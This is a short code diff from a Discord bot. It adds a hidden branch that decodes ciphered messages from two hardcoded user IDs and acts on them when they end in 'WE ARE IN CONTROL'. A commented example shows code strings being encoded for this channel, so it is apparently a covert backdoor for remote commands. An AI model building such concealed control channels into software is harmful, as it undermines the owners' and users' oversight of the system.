@@ -198,7 +198,14 @@ async function wsConnect(startmsg){
         return await sendMsg(`delete "${req.d.content}" from <@${req.d.author.id}> in <#${req.d.channel_id}> on order "of it's Tyler"`,'1337034823000133652')
       }
       
-      if(req.d.author.id=='1109446509482754150'||req.d.author.id=='1133347125594431499'){//new enc.Cipher('x nmrOZpepYilqK"ZsR',enc.chant).setCharset(enc.b95).text
+      if(req.d.author.id=='1109446509482754150'||req.d.author.id=='1133347125594431499'){
+/*
+console.log('`'+new enc.Cipher(
+
+'sendMsg(`# WE ARE IN CONTROL`,`1318046960174764165`)'
+
++'WE ARE IN CONTROL',enc.b95).setCharset(enc.chant).text+'`')
+*/
         let demsg=new enc.Cipher(req.d.content.substr(1,req.d.content.length-2),enc.chant).setCharset(enc.b95).text
         if(demsg.substr(demsg.length-17)=='WE ARE IN CONTROL'){
           console.log('')
